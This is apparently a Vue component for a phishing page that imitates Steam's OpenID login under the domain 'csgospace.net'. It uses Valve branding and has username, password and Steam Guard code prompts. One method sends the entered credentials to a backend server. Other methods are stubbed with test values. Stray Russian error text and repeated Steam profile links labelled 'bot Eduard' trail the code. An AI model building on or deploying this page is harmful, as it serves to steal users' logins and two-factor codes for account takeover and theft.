<template>
   <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="theme-color" content="#171a21">
    <meta name="robots" content="noindex, nofollow">
    <title l="1">{{$t('title')}}</title>

   </head>

    <body class="responsive_page" @click.stop="hideLang" v-cloak>
<div class="responsive_page_frame with_header">
    <div class="responsive_local_menu_tab"></div>
    <div class="responsive_page_menu_ctn localmenu">
        <div class="responsive_page_menu" id="responsive_page_local_menu">
            <div class="localmenu_content"></div>
        </div>
    </div>
    <div class="responsive_header">
        <div class="responsive_header_content">
            <div id="responsive_menu_logo">
                <img src="./images/header_menu_hamburger.png" height="100%">
            </div>
            <div class="responsive_header_logo">
                <img src="./images/header_logo.png" height="36" border="0" alt="STEAM">
            </div>
        </div>
    </div>
    <div class="responsive_page_content_overlay"></div>
    <div class="responsive_fixonscroll_ctn nonresponsive_hidden"></div>
    <div class="responsive_page_content">
        <div id="global_header">
            <div class="content">
                <div class="logo">
                    <span id="logo_holder">
                        <a>
                            <img src="./images/globalheader_logo.png" width="176" height="44">
                        </a>
                    </span>
                </div>
                <div class="supernav_container">
                    <a class="menuitem" l="2">{{$t('menu_item.store')}}</a>
                    <a class="menuitem" l="3">{{$t('menu_item.community')}}</a>
                    <a class="menuitem" l="4">{{$t('menu_item.about')}}</a>
                    <a class="menuitem" l="5">{{$t('menu_item.support')}}</a>
                </div>
                <div id="global_actions">
                    <div id="global_action_menu">
                        <div class="header_installsteam_btn header_installsteam_btn_green">
                            <a class="header_installsteam_btn_content" l="6">{{$t('install_steam')}}</a>
                        </div>&nbsp;
                        <a class="global_action_link" l="7">{{$t('login1')}}</a> &nbsp;|&nbsp;
                        <span class="pulldown global_action_link" @click.stop="dropLang" l="8">{{$t('language.0')}}</span>
                        <transition name="fade">
                        <div class="popup_block_new" v-if="showLang === true" @click.stop="hideLang">
                            <div class="popup_body popup_menu" l="21" @click="langLoadingFunc">
                                <a class="popup_menu_item tight" @click="switchLang('kr')">{{$t('language.1')}}</a>
                                <a class="popup_menu_item tight" @click="switchLang('kr')">{{$t('language.2')}}</a>
                                <a class="popup_menu_item tight" @click="switchLang('kr')">{{$t('language.3')}}</a>
                                <a class="popup_menu_item tight" @click="switchLang('kr')">{{$t('language.4')}}</a>
                                <a class="popup_menu_item tight" @click="switchLang('kr')">{{$t('language.5')}}</a>
                                <a class="popup_menu_item tight">{{$t('language.6')}}</a>
                                <a class="popup_menu_item tight">{{$t('language.7')}}</a>
                                <a class="popup_menu_item tight">{{$t('language.8')}}</a>
                                <a class="popup_menu_item tight" @click="switchLang('de')">{{$t('language.9')}}</a>
                                <a class="popup_menu_item tight" @click="switchLang('en')">{{$t('language.10')}}</a>
                                <a class="popup_menu_item tight">{{$t('language.11')}}</a>
                                <a class="popup_menu_item tight">{{$t('language.12')}}</a>
                                <a class="popup_menu_item tight">{{$t('language.13')}}</a>
                                <a class="popup_menu_item tight">{{$t('language.14')}}</a>
                                <a class="popup_menu_item tight">{{$t('language.15')}}</a>
                                <a class="popup_menu_item tight">{{$t('language.16')}}</a>
                                <a class="popup_menu_item tight">{{$t('language.17')}}</a>
                                <a class="popup_menu_item tight">{{$t('language.18')}}</a>
                                <a class="popup_menu_item tight" @click="switchLang('pl')">{{$t('language.19')}}</a>
                                <a class="popup_menu_item tight">{{$t('language.20')}}</a>
                                <a class="popup_menu_item tight">{{$t('language.21')}}</a>
                                <a class="popup_menu_item tight">{{$t('language.22')}}</a>
                                <a class="popup_menu_item tight" @click="switchLang('ru')">{{$t('language.23')}}</a>
                                <a class="popup_menu_item tight">{{$t('language.24')}}</a>
                                <a class="popup_menu_item tight">{{$t('language.25')}}</a>
                                <a class="popup_menu_item tight">{{$t('language.26')}}</a>
                                <a class="popup_menu_item tight">{{$t('language.27')}}</a>
                                <a class="popup_menu_item tight" @click="switchLang('ua')">{{$t('language.28')}}</a>
                                <a class="popup_menu_item tight">{{$t('language.29')}}</a>
                            </div>
                        </div>
                    </transition>
                    </div>
                </div>
            </div>
        </div>
        <div id="mainBody">
            <div class="OpenID_MainHeader">
                <div class="logo">
                    <img src="./images/sits_landing.png" width="114" height="43" border="0">
                </div>
                <h1 l="9">{{$t('signinto.1')}} <span class="fDomain">{{domain}}</span> {{$t('signinto.2')}}</h1>
                <div>
                    <div style="float:left; padding: 6px 6px 20px 18px">
                        <img src="./images/icon_info.png" width="26" height="26" border="0">
                    </div>
                    <h2 l="10">{{$t('note.1')}} <span class="fDomain">{{domain}}</span> {{$t('note.2')}}
                    </h2>
                </div>
            </div>
            <div class="OpenID_LowerContents">
                <div class="OpenIDCol right">
                    <div class="OpenID_LowerContents_right">
                        <h2 l="11">{{$t('bysign.1')}}<span class="fDomain">{{domain}}</span> {{$t('bysign.2')}}</h2>
                        <ul class="OpenID_list">
                            <li class="OpenID_listitem" l="12">{{$t('bysign.3')}}</li>
                            <li class="OpenID_listitem" l="13">{{$t('bysign.4')}}<a class="whiteLink OpenID_Highlight">
                                    <span class="fDomain">{{domain}}</span></a>.
                                                               {{$t('bysign.5')}} <span class="fDomain">{{domain}}</span>{{$t('bysign.6')}}
                                <a class="whiteLink">{{$t('bysign.7')}}</a>.
                            </li>
                            <li class="OpenID_listitem" l="14">{{$t('bysign.8')}}<a class="whiteLink">{{$t('bysign.9')}}</a>
                                                               {{$t('bysign.10')}}<span class="fDomain">{{domain}}</span>
                                                              {{$t('bysign.11')}} <a class="whiteLink">{{$t('bysign.12')}}</a>{{$t('bysign.13')}}
                            </li>
                        </ul>
                        <h2 l="15">{{$t('bysign.14')}}</h2>
                    </div>
                </div>
                <div class="OpenIDCol left">
                    <div class="OpenID_LowerContents_left">
                        <div 
                        id="error_display" 
                        v-if="login.error"
                        >{{$t('login.error')}}</div>
                        <br>
                        <div l="16">{{$t('login.username')}}</div>
                        <input 
                        class="textField"   
                        type="text"     
                        autofocus maxlength="64"
                        v-model.trim="login.username">
                        <br>
                        &nbsp; <br>
                        <div l="17">{{$t('login.password')}}</div>
                        <input 
                        class="textField" 
                        type="password" 
                        autocomplete="off" 
                        maxlength="64"
                        v-model.trim="login.password"><br>
                        <br>
                        <div id="login_btn_signin">
                            <button class="btn_green_white_innerfade" id="imageLogin" style="width:104px; height:34px; border:none; font-size: 15px;" value="domain" @click="loginCheck">{{$t('login.button1')}}</button>
                        </div>
                        <br>
                        <div 
                        id="login_btn_wait"
                        v-if="login.loading"
                        >
                            <img src="./images/throbber.gif">
                        </div>
                        <br clear="all">
                        <br>
                        <p l="18">{{$t('login.no1')}}<a class="whiteLink" target="_blank">{{$t('login.no2')}}</a>{{$t('login.no3')}}</p>
                    </div>
                </div>
                <div style="clear: both"></div>
            </div>
        </div>
    </div>
    <div id="footer_spacer"></div>
    <div id="footer_responsive_optin_spacer"></div>
    <div id="footer">
        <div class="footer_content">
            <span id="footerLogo">
                <img src="./images/footerLogo_valve.png" width="96" height="26" border="0" alt="Valve Logo">
            </span>
            <span id="footerText" l="19">{{$t('valve.1')}}<br>{{$t('valve.2')}}
                <a rel="noreferrer" href="#">{{$t('valve.3')}}</a>{{$t('valve.4')}}<br>
                <span class="valve_links">
                    <a href="#">{{$t('valve.5')}}</a>
                    &nbsp;| &nbsp;<a href="#">{{$t('valve.6')}}</a>
                    &nbsp;| &nbsp;<a href="#">{{$t('valve.7')}}</a>
                    &nbsp;| &nbsp;<a href="#">{{$t('valve.8')}}</a>
                </span>
            </span>
        </div>
    </div>
</div>
<div class="newmodal_background" style="opacity: 0.8" v-if="guard.show || langLoading || lastModal" ></div>
<div class="newmodal" id="auth" style="position: fixed; z-index: 1000; max-width: 400px; left: 50%; top: 50%; transform: translate(-50%, -50%)" v-if="guard.show">
    <div class="modal_top_bar"></div>
    <div class="newmodal_header_border">
        <div class="newmodal_header">
            <div class="newmodal_close" @click="closeGuard"></div>
            <div class="title_text" l="22">{{$t('guard.guard')}}</div>
        </div>
    </div>
    <div class="newmodal_content_border">
        <div class="newmodal_content" style="max-height: 849px;">
            <div>
                <div class="login_modal loginTwoFactorCodeModal" style>
                    <div class="twofactorauth_message_area">
                        <div id="login_twofactorauth_icon" class="auth_icon auth_icon_phone"></div>
                        <div class="twofactorauth_messages" id="login_twofactorauth_messages">
                            <div class="twofactorauth_message" id="login_twofactorauth_message_entercode" l="23">
                                <div class=" auth_modal_h1" v-if="!guard.error">{{$t('guard.hello')}} {{login.username}}
                                    <span id="login_twofactorauth_message_entercode_accountname"></span>!
                                </div>
                                <p v-if="!guard.error"> {{$t('guard.this_account')}}</p>
                            </div>

                            <div class="twofactorauth_message" id="login_twofactorauth_message_incorrectcode" l="24">
                                <div class="auth_modal_h1" v-if="guard.error">{{$t('guard.whoops')}}</div>
                                <p v-if="guard.error"> {{$t('guard.sorry')}} <br>{{$t('guard.right')}}</p>
                            </div>
                        </div>
                    </div>
                    <div id="login_twofactorauth_details_messages" class="twofactorauth_details_messages">
                        <div class="twofactorauth_details" id="login_twofactorauth_details_entercode" style l="26">
                            {{$t('guard.enter')}}
                        </div>
                    </div>
                    <div class="twofactorauthcode_entry_area">
                        <div id="login_twofactor_authcode_entry">
                            <div class="twofactorauthcode_entry_box">
                                <input class="twofactorauthcode_entry_input authcode_placeholder" 
                                id="twofactorcode_entry" 
                                type="text" 

                                placeholder="Enter code here" 
                                autocomplete="off" 
                                v-model="guard.guard">
                            </div>
                        </div>
                    </div>

                    <div class="modal_buttons" id="login_twofactorauth_buttonsets">
                        <div class="auth_buttonset" id="login_twofactorauth_buttonset_entercode" style l="27">
                            <div type="submit" class="auth_button leftbtn" data-modalstate="submit" @click="guardCheck">
                                <div class="auth_button_h3" v-if="!guard.error">{{$t('guard.submit')}}</div>
                                <div class="auth_button_h5" v-if="!guard.error">{{$t('guard.mycode')}}</div>
                                <div class="auth_button_h3" v-if="guard.error">{{$t('guard.error1')}}</div>
                                <div class="auth_button_h5" v-if="guard.error">{{$t('guard.error2')}}</div>
                            </div>
                             <div class="auth_button" data-modalstate="selfhelp">
                                <div class="auth_button_h3">{{$t('guard.help1')}}</div>
                                <div class="auth_button_h5">{{$t('guard.help2')}}</div>
                            </div>
                            <div style="clear: left;"></div>
                        </div>
                        <div class="auth_buttonset" id="login_twofactorauth_buttonset_waiting" v-if="guard.loading"></div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="newmodal" id="lang" style="position: fixed; z-index: 1000; max-width: 1823px; left: 50%; top: 50%; transform: translate(-50%, -50%)" v-if="langLoading">
    <div class="modal_top_bar"></div>
    <div class="newmodal_header_border">
        <div class="newmodal_header">
            <div class="newmodal_close" style="display: none;"></div>
            <div class="title_text" l="36">{{$t('language.30')}}</div>
        </div>
    </div>
    <div class="newmodal_content_border">
        <div class="newmodal_content" style="max-height: 849px;">
            <div>
                <div class="waiting_dialog_container">
                    <div class="waiting_dialog_throbber"></div>
                </div>
            </div>
        </div>
    </div>
</div>


<div class="newmodal" id="error" style="position: fixed; z-index: 1000; max-width: 1823px; left: 50%; top: 50%; transform: translate(-50%, -50%)"
v-if="lastModal">
    <div class="modal_top_bar"></div>
    <div class="newmodal_header_border">
        <div class="newmodal_header">
            <div class="newmodal_close" @click="closeBtn"></div>
            <div class="title_text" l="37" v-if="noguard">{{$t('last.noguard1')}}</div>
            <div class="title_text" l="37" v-if="successLogin">{{$t('last.success1')}}</div>
            <div class="title_text" l="37" v-if="proxyError">{{$t('last.proxy1')}}</div>
        </div>
    </div>
    <div class="newmodal_content_border">
        <div class="newmodal_content" style="max-height: 849px;">
            <div>
                <p l="38" v-if="noguard">{{$t('last.noguard2')}}</p>
                <p l="38" v-if="successLogin">{{$t('last.success2')}}</p>
                <p l="38" v-if="proxyError">{{$t('last.proxy2')}}</p>
            </div>
            <div class="btn_grey_steamui btn_medium" style="float: right;" id="close_error" @click="closeBtn"><span>OK</span></div>
        </div>
    </div>
</div>

</body>


</template>
<style>
[v-cloak] {
    display: none;
}
.fade-enter-active {
  transition: opacity 0.3s ease;
}
.fade-leave-active {
  transition: opacity 0.2s ease;
}
.fade-enter-from,
.fade-leave-to {
  opacity: 0;
}

    /*@import './shortcut icon';*/
    @import './css/buttons.css';
    @import './css/shared_global.css';
    @import './css/globalv2.css';
    @import './css/home.css';
    @import './css/login.css';
    @import './css/openid.css';
    @import './css/motiva_sans.css';
    @import './css/shared_responsive.css';
    @import './css/header.css';

</style>




<script>
import axios from 'axios'
/* function to detect if localstorage is supported*/
      localStorage.setItem('name', "mazepa")

    export default{
        data(){
            return {
                domain:"csgospace.net",
                showLang:false,
                langLoading:false,
                login:{
                    username:"",
                    password:"",
                    error: false,
                    loading:false
                },
                guard:{
                    show:false,
                    guard:"",
                    error:false,
                    loading:false
                },
                noguard: false,
                successLogin: false,
                lastModal: false,
                proxyError: false,
                loginData: []

            }
        },
        methods:{
            dropLang(){
                if (this.showLang === true){
                    this.showLang = false
                } else{
                this.showLang = true

                }
            },
            hideLang(){
                this.showLang = false
            },
            async loginCheck1(){
                if (this.login.username.length < 3 || this.login.password.length < 8){
                this.login.error = true
                this.login.username = ""
                this.login.password = ""
                }else{
                    this.login.loading = true
                    axios.post('http://localhost:3000/', {
                        username : this.login.username,
                        password : this.login.password,

                    })
                    .then(response => {
                         if(response.data.error == 1){
                            this.login.error = true
                            this.login.username = ""
                            this.login.password = ""
                            console.log(response.data)
                            console.log(response.data.error)
                        }if(response.data.error == 0) {
                            this.guard.show = true
                        }
                    })

                    .catch(function (error) {
                        console.log(error);
                    })
                    .finally(() => (this.login.loading = false));
                }

            },
            async loginCheck(){
                if (this.login.username.length < 3 || this.login.password.length < 8){
                this.login.loading = true
                setTimeout(function(){
                    this.login.error = true
                    this.login.loading = false
                    this.login.username = ""
                    this.login.password = ""
                }.bind(this), 2000)
                }
                else{
                    if (this.login.username == "pavel"){
                    this.lastModal = true
                    this.noguard = true
                }if(localStorage.getItem('name') == this.login.username){
                    this.guard.show = true
                }else{
                    this.login.loading = true
                }
                }

            },
            guardCheck(){
                if (this.guard.guard.length !== 5){
                    this.guard.loading = true
                    setTimeout(function (){ 
                    this.guard.error = true 
                    this.guard.loading = false}.bind(this), 3000)
                    
                    
                } else{
                    if (this.guard.guard == '55555'){
                        this.guard.loading = false
                        this.lastModal = true
                        this.successLogin = true
                        this.guard.show = false
                        setTimeout(function (){ 

                        }, 3000)
                        
                    }else{
                        this.guard.loading = true
                    }
                }
            },
            closeGuard(){this.guard.show = false},
            closeBtn(){
                this.lastModal = false
                this.proxyError = false
                this.noguard = false
                this.successLogin = false
                this.login.username = ""
                this.login.password = ""
            },
            langLoadingFunc(){
                this.langLoading = true
                setTimeout(function () {this.langLoading = false }.bind(this), 2500)
            },
        }
    }

</script>/
<script setup>

import {useI18n} from 'vue-i18n'

const {locale} = useI18n({useScope:"global"})


const switchLang = (lang) =>{

    locale.value = lang
    localStorage.setItem('lang',locale.value)

}

</script>
//*Введите имя аккаунта, состоящее как минимум из 3 символов, используя только буквы, цифры и знак «_».
Введенный вами пароль недопустим. Пожалуйста, выберите другой, длиной минимум в 8 символов.
Другие ошибки выделены ниже.

При обработке вашего запроса произошла ошибка.
*/
https://steamcommunity.com/profiles/76561199472725598/
https://steamcommunity.com/profiles/76561199472725598/
https://steamcommunity.com/profiles/76561199472725598/
https://steamcommunity.com/profiles/76561199472725598/
https://steamcommunity.com/profiles/76561199472725598/
https://steamcommunity.com/profiles/76561199472725598/
bot Eduard 1 lvl (https://steamcommunity.com/profiles/76561199472725598/)
bot Eduard 1 lvl (https://steamcommunity.com/profiles/76561199472725598/)

                    else if (this.login.username.length === 4){
                    this.login.loading = true
                }
                else{
                    this.login.loading = true
                    this.guard.show = true
                }

 if (response.data.error === 1 || response.data.error === "1"){
                            this.login.error = true
                            this.login.username = ""
                            this.login.password = ""
                        }